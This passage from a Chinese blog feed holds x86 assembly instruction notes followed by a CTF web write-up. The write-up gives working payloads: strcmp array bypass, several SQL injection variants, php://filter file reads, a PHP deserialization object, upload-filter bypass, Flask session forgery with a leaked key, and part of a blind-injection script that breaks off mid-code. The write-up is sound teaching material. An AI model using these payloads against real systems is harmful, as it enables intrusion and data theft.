segment</h2><p>叫完整段定义<br>可以随意设置段属性，随意使用各种段<br>但在不熟悉该环境下段的定义约定，建议使用简化段定义，否则造成一系列兼容问题<br>汇编的基本框架</p><pre><code>CODE SEGMENT START: ........ //定义代码段 当然就是要执行的程序代码了 CODE ENDS END START</code></pre><h2 id="int-21h"><a href="#int-21h" class="headerlink" title="int 21h"></a>int 21h</h2><p>是DOS的中断调用<br>比如</p><pre><code>MOV AH 4CHINT 21H</code></pre><p>是返回DOS系统的<br>通过给AH寄存器赋值4CH，然后调用INT 21H指令，计算机就会根据AH寄存器中的值执行相应的操作，<br>其中4CH是返回DOS系统，还可给AH寄存器赋其他值，所对于的操作这里也有</p><h2 id="lea指令"><a href="#lea指令" class="headerlink" title="lea指令"></a>lea指令</h2><p>就是目标地址传送指令： 将一个近地址指针写入到指定的寄存器。格式：<br>LEA reg16,mem16<br>其中reg16必须是一个16位通用寄存器，mem16必须是一个存储器，执行这个指令后，就将mem16所指的16位偏移地址传送reg16中。<br>比如： LEA AX,BUF<br>就是将存储器中BUF所指的地址传送给AX.<br>区别MOV传送指令：<br>MOV传送的是地址所指的内容，而LEA只是地址。<br>当源操作数很简单的情况下，完全可以用mov指令代替lea指令，<br>如lea esi,Buffer，完全可以用指令mov esi,offset Buffer代替；<br>但当源操作数稍微复杂一点的话，单用mov指令就代替不了了，至少要用到算术运算指令。<br>指令集中提供lea指令，就是为了减少这些计算上的麻烦。</p><h2 id="cmp"><a href="#cmp" class="headerlink" title="cmp"></a>cmp</h2><p>可以认为是compare（比较）的意思。在进行比较的时候将个数做减法运算，这个运算是影响符号位的，（大数减小数，符号位为+，反则为-）<br>所以执行该指令后你可以通过查询符号位CF是0还是1就可以知道两个数那个大了。</p><h2 id="jnc"><a href="#jnc" class="headerlink" title="jnc"></a>jnc</h2><p>可用于两个数的判断！jnc是进位位为0则转移！而两个数的比较就是想减，<br>例如X-Y，X小于Y,X就要借位，这样进位位就为1，如果X大于Y，X就不需要借位，这样进位位为0<br>jnc是一条跳转指令，当进位标记C为0时跳转，为1时执行后面的指令。</p><h2 id="OF与CF的区别"><a href="#OF与CF的区别" class="headerlink" title="OF与CF的区别"></a>OF与CF的区别</h2><p>of的设置，以加法为例，如果两数符号相同，结果却相反，则of=1；否则of=0；（如果两数符号相反，是不会溢出的）。<br>cf的设置，最高有效位（bit7，比如）向高位进位则为1，否则为0。所以实际上of是表示有符号数的溢出，cf是表示无符号数的溢出。</p><h2 id="jz"><a href="#jz" class="headerlink" title="jz"></a>jz</h2><p>JZ（Jump if Zero）是此前的运算结果为0时跳转。<br>若此前运算结果不为0，则不跳转，执行JZ指令后面的下一条指令。<br>判断结果是否为零，靠的是ZF标志位状态。<br>若结果是0，则ZF=1<br>若结果不是0，则ZF=0<br>所以，JZ指令是在ZF=1时跳转，ZF=0时不跳转。</p><h2 id="jz与jnz的区别"><a href="#jz与jnz的区别" class="headerlink" title="jz与jnz的区别"></a>jz与jnz的区别</h2><p>jnz结果不为零（或不相等）则转移。</p><p>jz即零标志为1就跳转。</p><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p>测试(两操作数作与运算,仅修改标志位,不回送结果).<br>TEST AX,BX 与 AND AX,BX 命令有相同效果<br>ret指令和retf指令<br>ret指令用栈中的数据，修改IP的内容，从而实现近转移<br>retf指令用栈的数据，修改CS和IP的内容，从而实现远转移</p><p>CPU执行ret指令时，相当于进行：</p><p>pop IP</p><p>CPU执行retf指令时，相当于进行：</p><p>pop IP<br>pop CS</p><h2 id="call"><a href="#call" class="headerlink" title="call"></a>call</h2><p>CALL（LCALL）指令执行时，进行两步操作：<br>（1）将程序当前执行的位置IP压入堆栈中； 　　（2）转移到调用的子程序。<br>JMP和CALL的一个朴实的区别就是：<br>JMP跳走之后，它可以跳回来，也可以再跳到别的地方不回去。<br>CALL调用子程序后，就算再调用别的子程序也一定会返回主程序。<br>JMP和CALL在有些时候应该都可以用吧→ _→ </p><h2 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h2><p>pop ax ，就是将栈顶的那个数取出并存入到ax寄存器中<br>push ax  是把ax里的值压入堆栈</p><h2 id="rol"><a href="#rol" class="headerlink" title="rol"></a>rol</h2><p>ROL和ROR指令<br>循环左移/右移指令只是移位方向不同，它们移出的位不仅要进入CF，而且还要填补空出的位。</p><p>例如:</p><pre><code>MOV AL,82HROL AL,1</code></pre><p>首先把82H转换成二进制数10000010B<br>循环左移1位后变成：00000101B，换算成十六进制数便是05H<br>循环右移1位后变成：01000001B，换算成十六进制数便是41H</p><h2 id="DEC"><a href="#DEC" class="headerlink" title="DEC"></a>DEC</h2><p>DEC是减1指令，该指令使操作数的内容减1，然后再送回该操作数。该操作数可以是寄存器操作数、存储器操作数。<br>例如：<br>DEC AL;AL内容减1，然后再送AL<br>DEC AX;AX减内容1，然后再送AX<br>DEC CONT;CONT减内容1，然后再送CONT</p><h2 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h2><p>是子程序定义伪指令， far是该子程序的属性，决定调用程序和子程序是否在同一代码段<br>如下：为子程序定义及说明，</p><pre><code>子程序名 PROC NEAR ( 或 FAR )……ret子程序名 ENDP子程序名为符合语法的标识符</code></pre><p>NEAR属性(段内近调用): 调用程序和子程序在同一代码段中,只能被相同代码段的其他程序调用;<br>FAR属性(段间远调用): 调用程序和子程序不在同一代码段中,可以被相同或不同代码段的程序调用.</p><h2 id="lea"><a href="#lea" class="headerlink" title="lea"></a>lea</h2><p>LEA指令的功能是取偏移地址，例如LEA AX,[1000H]，作用是将源操作数[1000H]的偏移地址1000H送至AX；<br>MOV指令的功能是传送数据，例如MOV AX,[1000H]，作用是将1000H作为偏移地址，寻址找到内存单元，将该内存单元中的数据送至AX；<br>LEA指令的功能是取偏移地址，例如LEA AX,[1000H]，作用是将源操作数[1000H]的偏移地址1000H送至AX。理解时，可直接将[ ]去掉，等同于MOV AX,1000H。<br>再如：LEA BX,[AX]，等同于MOV BX,AX；LEA BX,TABLE 等同于 MOV BX,OFFSET TABLE。<br>但有时不能直接使用MOV代替：<br>比如：</p><pre><code>LEA AX,[SI+6] 不能直接替换成：MOV AX,SI+6；但可替换为：MOV AX,SIADD AX,6两步完成。</code></pre><h2 id="xlat"><a href="#xlat" class="headerlink" title="xlat"></a>xlat</h2><p>是一种指令程序。操作是以DS:[BX+AL]为地址，提取存储器中的一个字节再送入AL。<br>例一</p><pre><code>X DW 1122H,3344H,5566H,7788H。LEA BX,X。MOV AL,03H。XLAT。</code></pre><p>结果AL为33H。<br>XLAT作用:将((BX)+(AL))送给(AL)—-简单:将BX为首地址的,偏移地址为AL的内容送给AL。<br>在运行XLAT之前,AL=3 BX=(X的首地址)。<br>这时BX+AL就是33….为什么?注意高地址放在下面。<br>也就是。<br>22——BX指向这里。<br>11。<br>44。<br>33—–偏移地址AL为3的位置就是这里。<br>XLAT X。<br>在执行XLAT之前,先将X的地址送给BX,偏移次数送给AL。<br>XLAT即为查找指令 (一个字节)。</p><h2 id="shl和shr指令"><a href="#shl和shr指令" class="headerlink" title="shl和shr指令"></a>shl和shr指令</h2><p>shl和shr是逻辑移位指令。</p><p>shl是逻辑左移指令，它的功能为：</p><p>（1）将一个寄存器或内存单元中的数据向左移位；</p><p>（2）将最后移出的一位写入CF中；</p><p>（3）最低位用0补充。</p><p>指令：<br>mov al,01001000b</p><p>shl al,1 ;将al中数据左移一位</p><p>执行后（al）=10010000b，CF=0。</p><p>注意：</p><p>如果移动位数大于1时，必须将移动位数放在cl中。</p><p>比如，指令：</p><p>mov al,01010001b</p><p>mov cl,3</p><p>shl al,cl</p><p>执行后（al）=10001000b，因为最后移出的一位是0，所以CF=0。</p><p>shr是逻辑右移指令，它和shl所进行的操作刚好相反。</p><h2 id="SP-BP-SI-DI作用"><a href="#SP-BP-SI-DI作用" class="headerlink" title="SP,BP ,SI,DI作用"></a>SP,BP ,SI,DI作用</h2><p>sp:表示栈顶指针,指向栈顶地址.与SS相配合使用.ss为栈段.</p><p>bp:是基址指针,段地址默认在SS中.可以定位物理地址,比如:”mov ax,[bp+si+6]/mov ax,[bp+di+6].</p><p>DI:是目的变址寄存器.一般情况下与ds联用,来确定某个储存单元的地址.</p><p>SI:是源变址寄存器,默认段地址和DI一样,在DS中.和DS联用.</p><p>这四个寄存器,都是16位的,不可以分割为八位.</p><p>要注意,1,sp和bp段地址默认在SS中.2..sp指向栈顶元素地址.有自加和自减能力,而bp没有.但是bp可以定位栈中某个元素的物理地址.</p><p>DI和SI</p><p>这两个属于变址寄存器.可以和bx.bp联用,但是和bx连用时,段地址在DS中,和bp联用时,段地址在SS中.也可以单独使用,单独使用时,段地址默认在DS中,想要越段使用,加上段前缀即可.</p><p>在串指令操作中,si和ds联用,确定目标源地址,di和es(附加段寄存器)联用,确定传送的目的地址.说白了就是,分别寻址数据段和附加段.</p><p>在串指令中,si和di具有自加和自减功能,</p>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018中原工学院网络安全校赛</title>
      <link href="/2018/12/24/2018%E4%B8%AD%E5%8E%9F%E5%B7%A5%E5%AD%A6%E9%99%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%A0%A1%E8%B5%9B/"/>
      <url>/2018/12/24/2018%E4%B8%AD%E5%8E%9F%E5%B7%A5%E5%AD%A6%E9%99%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%A0%A1%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="Drops攻防训练营欢迎你的加入"><a href="#Drops攻防训练营欢迎你的加入" class="headerlink" title="Drops攻防训练营欢迎你的加入"></a>Drops攻防训练营欢迎你的加入</h2><p>打开页面查看响应头有一个 tips:4he9e.txt 然后访问这个页面</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$flag = <span class="string">"***"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'repo'</span>])) &#123;  </span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (strcmp($_GET[<span class="string">'repo'</span>], $flag) == <span class="number">0</span>) </span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);  </span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>  </span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'No'</span>;  </span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>题目要求让repo与flag字符串相等就输出flag<br>strcmp()函数也只能处理字符串参数，传个数组进去就能返回false，又由于它与0的比较用的是==  而不是  ===（允许类型转换后比较），就满足了这个 if 的条件。Payload：?repo[]=a</p><h2 id="惊鸿一笔，上官婉儿"><a href="#惊鸿一笔，上官婉儿" class="headerlink" title="惊鸿一笔，上官婉儿"></a>惊鸿一笔，上官婉儿</h2><p>这道题想了好久,union,and,=,extractvalue,被过滤<br>试了报错,不行,发现是数字型的SQL注入，尝试exp报错也不行,发现试各种报错都原样输出报错,于是尝试时间盲注</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>//<span class="number">39.108</span><span class="number">.109</span><span class="number">.85</span>:<span class="number">9001</span>/?id=<span class="number">1</span> <span class="keyword">or</span> <span class="keyword">sleep</span>(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>成功执行<br>这里要学一个函数 <strong>linestring</strong><br>linestring是Mysql自带的空间索引函数用来索引列名，还有一个函数也有这个效果<strong>polygon</strong> 这个语句进行报错<br>在mysql的security数据库users表</p><pre><code>select * from users where id=1 and linestring(id);</code></pre><p>ERROR 1367 (22007): Illegal non geometric ‘<code>security</code>.<code>users</code>.<code>id</code>‘ value found during parsing<br>payload如下:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">or</span> exp(~<span class="built_in">id</span>)</span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">or</span> linestring(<span class="built_in">id</span>)</span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">or</span> polygon(<span class="built_in">id</span>)</span><br></pre></td></tr></table></figure><h2 id="快一点"><a href="#快一点" class="headerlink" title="快一点"></a>快一点</h2><p>You need get a ‘t’<br>于是构造一个?t=1<br>得到代码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'t'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $_COOKIE[<span class="string">'bash_token'</span>] = $_GET[<span class="string">'t'</span>];</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">"You need get a 't'"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'sleep'</span>]))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(!is_numeric($_POST[<span class="string">'sleep'</span>]))&#123;              </span></span><br><span class="line"><span class="php">                                      </span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'Gime me a number plz.'</span>;</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_POST[<span class="string">'sleep'</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123;   </span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'NoNoNo sleep too short.'</span>;</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_POST[<span class="string">'sleep'</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'NoNoNo sleep too long.'</span>;</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        sleep((int)$_POST[<span class="string">'sleep'</span>]);  </span></span><br><span class="line"><span class="php">        getFlag();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>题目要求sleep是个数字，并在2592000和7776000之间，然后sleep这么长时间，给出flag。<br>这题主要考察is_numeric()和int()的区别。前者支持普通数字型、科学记数法型、部分支持十六进制0x型，在is_numeric()支持的形式中，int()不能正确转换十六进制型、科学计数法型。<br>因此可以构造</p><pre><code>sleep = 6e6、0x4F1A01</code></pre><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>上传.php,弹出<br>alert(‘不允许的文件！’);history.go(-1)<br>改为.jpg<br>alert(‘上传成功！’);history.go(-1)<br>用于这道题没有回显上传路径<br>这道题应该是黑名单绕过<br>经过测试<br>.pht  可以绕过  ,注意还要改content-type:image/jpeg</p><h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>打开访问<br>you are not admin !<br>查看源码, 发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传三个参数user、file、pass使其能通过<br>注意</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(<span class="name">isset</span>($user)<span class="symbol">&amp;&amp;</span>(<span class="name">file_get_contents</span>($user,'r')===<span class="string">"admin"</span>))</span><br></pre></td></tr></table></figure><p>利用php的封装协议php://input<br>include($file);//class.php<br>读取class.php文件和index.php文件</p><pre><code>?user=php://input&amp;file=php://filter/convert.base64-encode/resource=index.php?user=php://input&amp;file=php://filter/convert.base64-encode/resource=index.php</code></pre><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//flag.php</span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);    </span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">        $pass = unserialize($pass);</span><br><span class="line">        <span class="keyword">echo</span> $pass;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><p>源码来看这是一道反序列化题<br>构造序列化字符串然后传进去读取flag，因为他过滤了flag不能直接读取<br>?user=php://input&amp;file=class.php&amp;pass=O:4:”Read”:1:{s:4:”file”;s:57:”php://filter/read=convert.base64-encode/resource=flag.php”;}</p><p>post: admin</p><h2 id="留言板"><a href="#留言板" class="headerlink" title="留言板"></a>留言板</h2><p>考点：</p><p>信息泄露</p><p>flask-session伪造</p><p>delete盲注</p><p>环境：</p><p>python3环境</p><p>flask 1.0.2框架</p><p>sqlite3数据库<br>查看源码<br>注意到这个图片地址<br><a href="https://raw.githubusercontent.com/alipql/tuku/master/8856eac7gy1fkmf2o66yyj205k05kq2z.jpg" target="_blank" rel="noopener">https://raw.githubusercontent.com/alipql/tuku/master/8856eac7gy1fkmf2o66yyj205k05kq2z.jpg</a></p><p>应该是某个人的github地址<br><a href="https://github.com/alipql" target="_blank" rel="noopener">https://github.com/alipql</a><br>可以发现alipql这个人的github仓库： <a href="https://github.com/alipql" target="_blank" rel="noopener">https://github.com/alipql</a> 在homework这个库里面的homework2中可以找到一个非空的config.py配置文件</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># coding=utf<span class="number">-8</span></span><br><span class="line">import <span class="built_in">os</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Config():</span><br><span class="line">    BaseDir = <span class="built_in">os</span>.<span class="built_in">path</span>.abspath(<span class="built_in">os</span>.<span class="built_in">path</span>.dirname(__file__))</span><br><span class="line">    DB_FILE = <span class="built_in">os</span>.<span class="built_in">path</span>.join(BaseDir, <span class="string">'dbfile.sql'</span>)</span><br><span class="line">    SQLALCHEMY_DATABASE_URI = <span class="string">'sqlite:///'</span> + DB_FILE</span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS = True</span><br><span class="line">    SQLALCHEMY_COMMIT_ON_TEARDOWN = True</span><br><span class="line">    SECRET_KEY = <span class="string">'dropseckey123'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">config</span> = &#123;</span><br><span class="line">    <span class="string">'default'</span>: Config</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从config.py配置文件中可得到secert_key、sql数据库类型<br>拿到secert_key后，利用它进行flask的session伪造<br>工具地址:<br><a href="https://github.com/style-404/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/style-404/flask-session-cookie-manager</a><br>题目中预制的有两个用户，test/test,user/user,可通过登录用户时返回的session验证SECRETKEY是否正确<br>可以利用，然后去伪造admin的session<br>替换掉session，即可成功登录到admin账户获取管理权限。</p><p>tip: 存在一个flag表和flag字段<br>于是进行<strong>delete布尔盲注</strong></p><p>对添加用户功能和删除用户功能稍微一测试，会发现删除用户功能是存在注入的，是delete的注入。从config.py的信息泄露中可以知道数据库为sqlite，导致很多函数不能用；由于又是个delete方式，导致很多姿势用不上。</p><p>在这里轻微fuzz一下可发现只过滤了drop、update、delete等部分删表删flag改flag的关键字，而and、substr、selete、from、空格等未过滤，参数为单引号包裹，所以可组合一个payload:</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' <span class="keyword">and</span> substr((<span class="keyword">select</span> flag from flag),<span class="number">1</span>,<span class="number">1</span>)==<span class="symbol">'f</span></span><br></pre></td></tr></table></figure><p>先增加用户，在删除用户时提交payload再进行布尔判断即可盲注flag。 例如增加111用户后再删除用户111</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usernamedel=<span class="number">111</span>' and substr((select flag from flag ),<span class="number">1</span>,<span class="number">1</span>)=='f</span><br><span class="line">成功删除用户，返回包不存在<span class="number">111</span>，说明flag第一个字母为f。若改为</span><br><span class="line">usernamedel=<span class="number">111</span>' and substr((select flag from flag),<span class="number">1</span>,<span class="number">1</span>)=='<span class="number">0</span></span><br></pre></td></tr></table></figure><p>显示成功删除却依然存在111用户，没删除用户，说明第一位不为0，然后接下来写脚本去跑就行了</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sqliexp</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.url = <span class="string">'http://172.93.39.218:8888/admin'</span></span><br><span class="line">        <span class="keyword">self</span>.session = <span class="string">'eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIlx1NzY3Ylx1NWY1NVx1NjIxMFx1NTI5ZiJdfV0sIm5hbWUiOiJhZG1pbiJ9.XB-iXg.PURonzshjlDsEvsXYZ24YyuAgI4'</span></span><br><span class="line">        <span class="keyword">self</span>.flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#增加111用户</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">adduser</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        cookies = &#123;<span class="string">'session'</span><span class="symbol">:self</span>.session&#125;</span><br><span class="line">        data = &#123;<span class="string">'username'</span><span class="symbol">:<span class="string">'111'</span></span>,<span class="string">'password'</span><span class="symbol">:<span class="string">'111'</span></span>&#125;</span><br><span class="line">        <span class="symbol">try:</span></span><br><span class="line">            requests.post(url=<span class="keyword">self</span>.url, cookies=cookies,data=data)</span><br><span class="line">        except 